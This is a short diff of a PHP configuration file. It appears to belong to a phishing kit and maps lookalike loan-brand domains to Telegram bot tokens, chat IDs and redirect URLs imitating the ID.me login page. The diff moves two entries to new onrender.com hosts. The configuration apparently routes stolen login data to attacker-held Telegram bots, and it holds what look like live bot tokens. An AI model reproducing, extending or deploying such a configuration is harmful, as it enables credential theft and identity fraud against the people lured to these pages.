@@ -24,21 +24,21 @@ $site_map = [
     ],
 
 
-    'crediblellc.info' => [
+    'credibleinc.onrender.com' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8728991586:AAExYzi09TMjfvHx6l7EU6JGTjboXypLlQg', 'chat_id' => '5850580289']
         ],
-        'redirect' => 'https://crediblellc.info/api.id.me/en/session/new.html'
+        'redirect' => 'https://credibleinc.onrender.com/api.id.me/en/session/new.html'
     ],
 
 
-    'credibleloan.42web.io' => [
+    'credibleloans.onrender.com' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8716516943:AAGW8BoxYb7J34yA8truv9rCfM1rvdWYuiQ', 'chat_id' => '7373435774']
         ],
-        'redirect' => 'https://credibleloan.42web.io/api.id.me/en/session/new.html'
+        'redirect' => 'https://credibleloans.onrender.com/api.id.me/en/session/new.html'
     ],
 
 
